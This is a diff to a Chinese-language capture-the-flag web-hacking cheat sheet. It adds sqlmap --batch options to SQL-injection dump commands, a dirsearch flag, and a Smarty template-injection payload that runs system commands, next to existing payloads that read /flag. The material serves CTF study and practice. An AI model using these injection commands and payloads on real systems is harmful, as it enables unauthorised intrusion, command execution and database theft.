@@ -49,6 +49,7 @@ X-Forwarded-For: 127.0.0.1
 - 一个复杂的网页，页面中很可能隐藏了重要外链
 - 见过在一个很长的 js 文件中藏了一个注释，例如 /f@k3f1ag.php
 - 看到类似 `(+[![]]+[])[+[]]+` 的密文要联想到 jsfuck，可以直接在控制台执行
+- 注意观察前端填写的 `payload` 和抓包结果是否一致，有时候是前端限制，必须通过接口发送数据
 
 #### 网页链接提取
 
@@ -221,7 +222,12 @@ find / -type f 2>/dev/null | grep -Ei 'f{1,5}l{1,5}a{1,5}g{1,5}'
 ### 目录扫描
 
 #### dirsearch
-> Web 目录扫描工具
+Web 目录扫描工具
+
+参数：
+
+`--exclude-sizes 20KB,21KB` : 排除 20 到 21KB 的响应
+
 ```bash
 # 用法：
 python3 dirsearch.py -t 100 -u https://target
@@ -323,21 +329,25 @@ if __name__ == '__main__':
 
 #### sqlmap
 
+参数
+
+- `--batch`：这个参数使 sqlmap 在遇到需要用户输入的情况时，自动使用默认选项。这通常在你想要无人值守地运行 sqlmap 时使用。
+
 ##### GET
 ```bash
 # 找到注入点，如 /?id=1
 # 查数据库
-python sqlmap.py -u http://x.com/?id=1 --dbs
+python sqlmap.py --batch -u http://x.com/?id=1 --dbs
 # 查 N 数据库的表名
-python sqlmap.py -u http://x.com/?id=1 -D N --tables
+python sqlmap.py --batch -u http://x.com/?id=1 -D N --tables
 # 查 N 数据库的A 表的列名
-python sqlmap.py -u http://x.com/?id=1 -D N -T A --columns
+python sqlmap.py --batch -u http://x.com/?id=1 -D N -T A --columns
 # 查 N 数据库的 A 表的 B 列数据
-python sqlmap.py -u http://x.com/?id=1  -D N -T A -C B --dump
+python sqlmap.py --batch -u http://x.com/?id=1  -D N -T A -C B --dump
 
 
 # 高级注入（只举例第一步，同样适用于 POST 请求）
-python sqlmap.py -u http://x.com/?id=1 --batch --level=3 --tamper=space2comment.py --dbs
+python sqlmap.py --batch -u http://x.com/?id=1 --batch --level=3 --tamper=space2comment.py --dbs
 ```
 
 ##### POST
@@ -841,13 +851,25 @@ post data:<?php system("ls /"); ?>
 
 - 遇到了模版如 Smarty，很大概率是 SSIT 漏洞
 
-###### 注入格式
+###### 注入方法一
 
 遇到一道题，ip 由 `X-Forwarded-For` 的传入值来渲染，则通过 `X-Forwarded-For` 来注入
 
 ```
 X-Forwarded-For={system('cat /flag')}
 ```
+
+###### 注入方法二
+
+- 方法一的注入更简洁
+
+POST 参数为 data:
+
+```
+data={if system('ls')}{/if}
+```
+
+
 
 ###### 提交 POST
 
